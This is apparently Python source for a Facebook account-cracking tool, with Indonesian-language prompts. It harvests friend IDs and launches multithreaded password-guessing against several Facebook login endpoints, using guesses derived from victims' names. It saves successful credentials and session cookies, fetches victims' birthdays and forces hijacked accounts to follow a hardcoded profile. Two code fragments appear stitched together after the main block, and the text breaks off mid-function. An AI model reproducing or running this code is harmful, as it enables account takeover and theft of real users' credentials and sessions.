			otw = re.findall('\<a\ class\=\".."\ href\=\"/friends/hovercard/mbasic/\?uid=(\\d*).*?"\>(.*?)</a\>',respon)
			if len(otw)!=0:
				for i in otw:
					self.id.append(i[0]+"<=>"+i[1])
					print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
					if len(self.id)==jum:
						true=True
						break
			if true==False:
				if "Lihat selengkapnya" in respon:
					self.saran(self.url+parser(respon,"html.parser").find("a",string="Lihat selengkapnya").get("href"),jum)
		except:
			pass
			
# USER AGENT
def user_agentAPI():
	ugent =[
	    "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12",
	    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)",
        "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
        "NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
        "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
        "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
        "Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
       "Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
       "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
       "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
       "[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]"]
	rand_ua = random.choice(ugent)
	return rand_ua
	
# GANTI USER AGENT
def seting_yntkts():
    print('\n (%s1%s) ganti user agent'%(O,N))
    print(' (%s2%s) check user agent'%(O,N))
    ytbjts = input('\n %s[%s?%s] choose : '%(N,O,N))
    if ytbjts == '':
        print('\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N));time.sleep(2);seting_yntkts()
    elif ytbjts in['1','01']:
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in['2','02']:
        try:
            user_agent = open('.YNTKTS.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print('\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent))
        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    else:
        print('\n %s[%s×%s] input yang bener'%(N,M,N));time.sleep(2);seting_yntkts()
		
# USER AGENT BARU
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf .YNTKTS.txt')
    _asu_ = input('\n [%s?%s] ingin menggunakan user agent hp anda [Y/t]: '%(O,N))
    if _asu_ == '':
        print('\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N));yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in['Y','y']:
        jalan('\n %s *%s anda akan di arakan ke situs web setelah di arahkan ke situs web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.yayanxd.my.id/server')
        _agen_ = input(' [%s?%s] masukan user agent hp anda :%s '%(O,N,H))
        open('.YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] berhasil menggunakan user agent hp anda...'%(N,H,N))
        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    elif _asu_ in['T','t']:
        _agen_ = input(' [%s?%s] masukan user agent :%s '%(O,N,H))
        open('.YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    else:
        print('\n %s[%s!%s] Y/t ngentod'%(N,M,N));yo_ndak_tau_ko_tanya_saia()

# MULAI CRACK
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self,id):
        self.id = id
        print('\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N))
        ___yayanganteng___ = input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print('\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N))
            while True:
                pwek = input('\n [%s?%s] masukan kata sandi : '%(O,N))
                print(' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N))
                if pwek == '':
                    print('\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N))
                elif len(pwek)<=5:
                    print('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = input('\n [*] method : ')
                        if cin == '':
                            print('\n %s[%s×%s] jangan kosong bro'%(N,M,N));__yan__()
                        elif cin == '1':
                            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '2':
                            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '3':
                            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb__, kimochi, ysc)
                                    except: pass

                            hasil(ok,cp)
                        else:
                            print('\n %s[%s×%s] input yang bener'%(N,M,N));__yan__()
                    print('\n [ pilih method login - silahkan coba satu² ]\n')
                    print(' [%s1%s]. method API (fast)'%(O,N))
                    print(' [%s2%s]. method mbasic (slow)'%(O,N))
                    print(' [%s3%s]. method mobile (super slow) [\033[92mDisarankan\033[0m]'%(O,N))
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print('\n [ pilih method login - silahkan coba satu² ]\n')
            print(' [%s1%s]. method API (fast)'%(O,N))
            print(' [%s2%s]. method mbasic (slow)'%(O,N))
            print(' [%s3%s]. method mobile (super slow) [\033[92mDisarankan\033[0m]'%(O,N))
            self.__pler__()
        else:
            print('\n %s[%s×%s] y/t goblok!'%(N,M,N));self.plerr(id)

    def __api__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
            if "access_token" in p:
                print('\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,N))
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "www.facebook.com" in p["error_msg"]:
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r  %s* --> %s|%s                %s' % (K,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1

    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        for pw in __yan__:
            pw = pw.lower()
            try:
                REQ=requests.Session()
                r = REQ.get("https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header_mbasic())
                das={
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                REQ.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header_post_mbasic(), allow_redirects = False)
                cok=REQ.cookies.get_dict()
                if "c_user" in cok:
                    print(f'\r  {H}* --> {user}|{pw}|{convert_cookie(cok)}{N}')
                    wrt = ' [✓] %s|%s|%s' % (user,pw,convert_cookie(cok))
                    ok.append(wrt)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    self.follow(REQ,convert_cookie(cok))
                    break
                elif "checkpoint" in cok:
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = REQ.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                        wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r  %s* --> %s|%s                %s' % (K,user,pw,N))
                    wrt = ' [×] %s|%s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    pass
                for i in list('\|-/'):
                    sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
                    sys.stdout.flush()
            except:
                pass
        loop += 1

    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            REQ=requests.Session()
            r = REQ.get("https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header_get())
            das={
                "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                "uid":user,
                "flow":"login_no_pin",
                "pass":pw,
                "next":"https://developers.facebook.com/tools/debug/accesstoken/"
            }
            REQ.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header_post(), allow_redirects = False)
            cok=REQ.cookies.get_dict()
            if "c_user" in cok:
                print(f'\r  {H}* --> {user}|{pw}|{convert_cookie(cok)}{N}');self.follow(REQ,convert_cookie(cok))
                wrt = ' [✓] %s|%s|%s' % (user,pw,convert_cookie(cok))
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                self.follow(REQ,convert_cookie(cok))
                break
            if "checkpoint" in cok:
                try:
                    tokenz = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,tokenz)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r  %s* --> %s|%s                %s' % (K,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
#    <- Bot followers ->
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100005395413800",cookies={"cookie":coki}).text,"html.parser")
        get = r.find("a",string="Ikuti").get("href")
        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text

    def __pler__(self):
        yan = input('\n [*] method : ')
        if yan == '':
            print('\n %s[%s×%s] jangan kosong bro'%(N,M,N));self.__pler__()
        elif yan in ('1', '01'):
            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__api__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        elif yan in ('2', '02'):
            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        elif yan in ('3', '03'):
            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        else:
            print('\n %s[%s×%s] input yang bener'%(N,M,N));self.__pler__()


if __name__ == '__main__':
    moch_yayan()

			
	# TOUCH
	def touch(self, user, manual, **data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if "c_user" in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s*--> %s ◊ %s ◊ %s %s %s ◊ %s '%(H,user,pw,day,month,year,kukis))
						os.popen("play-audio dapet.mp3")
						ok.append("%s ◊ %s ◊ %s %s %s ◊ %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s ◊ %s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s*--> %s ◊ %s ◊ %s '%(H,user,pw,kukis))
					os.popen("play-audio dapet.mp3")
					ok.append('%s ◊ %s ◊ %s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s*--> %s ◊ %s ◊ %s %s %s  '%(K,user,pw,day,month,year))
						os.popen("play-audio dapet.mp3")
						cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s*--> %s ◊ %s           '%(K,user,pw))
					os.popen("play-audio dapet.mp3")
					cp.append('%s ◊ %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.touch(user, manual, **data)
			
	# MBASIC
	def basic(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
